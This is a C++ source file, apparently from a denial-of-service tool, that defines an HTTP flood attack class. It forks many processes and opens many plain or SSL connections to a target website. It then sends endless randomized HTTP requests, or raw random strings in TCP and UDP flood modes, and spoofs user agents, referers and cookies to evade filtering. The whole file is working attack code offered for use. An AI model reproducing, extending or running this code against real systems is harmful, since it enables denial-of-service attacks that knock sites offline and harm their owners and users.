#include <netdb.h>
#include <cstring>
#include <utility>
#include <unistd.h>
#include <openssl/ssl.h>

#include "../Headers/Http_Flood.hpp"
#include "../Headers/httphdr.hpp"
#include "../Headers/Logging.hpp"


Http_Flood::Http_Flood(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)){

}

void Http_Flood::run() {
    for (int x = 0; x < conf->THREADS; x++) {
        if(fork()){
            if(conf->UseSSL){
                attack_ssl();
            }else{
                attack();
            }
        }
    }
    getc(stdin);
}

int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
    struct addrinfo hints{}, *servinfo, *p;
    int sock = 0, r;
    bzero(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = sock_type;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        char message[512];
        snprintf(message, sizeof(message), "Getaddrinfo-> %s", gai_strerror(r));
        print_error(message);
        exit(EXIT_FAILURE);
    }
    for(p = servinfo; p != nullptr; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == nullptr) {
        if(servinfo){
            freeaddrinfo(servinfo);
        }
        print_error("No connection could be made");
        exit(EXIT_FAILURE);
    }
    if(servinfo){
        freeaddrinfo(servinfo);
    }
    return sock;
}

SSL_CTX *Http_Flood::InitCTX() {
    SSL_library_init();
    const SSL_METHOD *method{GetMethod()};
    SSL_CTX *ctx;
    ctx = SSL_CTX_new(method);
    if (ctx == nullptr){
        print_error("Unable to connect using ssl");
        exit(EXIT_FAILURE);
    }
    return ctx;
}

SSL *Http_Flood::Apply_SSL(int socket, SSL_CTX *ctx) {
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, socket);
    if(SSL_connect(ssl) == -1){
        print_error("Unable to connect using ssl");
        exit(EXIT_FAILURE);
    }
    return ssl;
}

void Http_Flood::cleanup(const int *socket) {
    close(*socket);
}

void Http_Flood::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
    SSL_free(ssl);
    close(*socket);
    SSL_CTX_free(ctx);
}

void Http_Flood::read_socket(int socket) {
    char chunk[128];
    while(read(socket , chunk, 128)){
        bzero(chunk, sizeof(chunk));
    }
}

void Http_Flood::read_socket(SSL *ssl) {
    char chunk[128];
    while(SSL_read(ssl , chunk, 128)){
        bzero(chunk, sizeof(chunk));
    }
}

int Http_Flood::write_socket(int socket, const char *string, int length) {
    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
}

int Http_Flood::write_socket(SSL *ssl, const char *string, int length) {
    return (SSL_write(ssl, string, length));
}

void Http_Flood::attack() {
    int r;
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    while(true) {
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
            }
            httphdr header{};
            init_header(&header);
            if((r = write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
            }else{
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                conf->voly++;
            }
        }
        conf->voly++;
        pause();
    }
}

void Http_Flood::attack_ssl() {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
        SSLs.emplace_back(nullptr);
        CTXs.emplace_back(nullptr);
    }
    while(true) {
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }
            httphdr header{};
            init_header(&header);
            if((r = write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }else{
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                conf->voly++;
            }
        }
        conf->voly++;
        pause();
    }
}

const SSL_METHOD *Http_Flood::GetMethod() {
    switch (conf->protocol){
        case Config::TCP:
            return TLS_client_method();
        case Config::UDP:
#ifdef DTLS_ANY_VERSION
            return DTLS_client_method();
#else
            conf->logger->Log("Unable to find DTLS", Logger::Info);
            exit(EXIT_FAILURE);
#endif
        default:
            return nullptr;
    }
}

void Http_Flood::init_header(httphdr *header) {
    switch (conf->vector){
        case Config::UDPFlood:
        case Config::TCPFlood:
            Randomizer::randomstr((std::string&)*header);
            break;
        case Config::HTTP:{
             Randomizer::random_method(header->method);
            if(conf->RandomizeHeader){
                Randomizer::randomstr(header->path);
            }
            Randomizer::random_useragent(*(conf->useragents), header->useragent);
            Randomizer::random_caching(header->cache_control);
            Randomizer::random_encoding(header->encoding);
            Randomizer::random_charset(header->charset[0]);
            Randomizer::random_charset(header->charset[1]);
            Randomizer::random_referer(header->referer);
            header->accept = "*/*";
            header->connection_type = "Keep-Alive";
            Randomizer::random_contenttype(header->content_type);
            Randomizer::randomstr(header->cookie[0]);
            Randomizer::randomstr(header->cookie[1]);
            header->keep_alive = Randomizer::randomInt(1, 5000);
            header->DNT = Randomizer::randomInt(0, 1);
            header->generate();
            break;
        }
        default:break;
    }
}
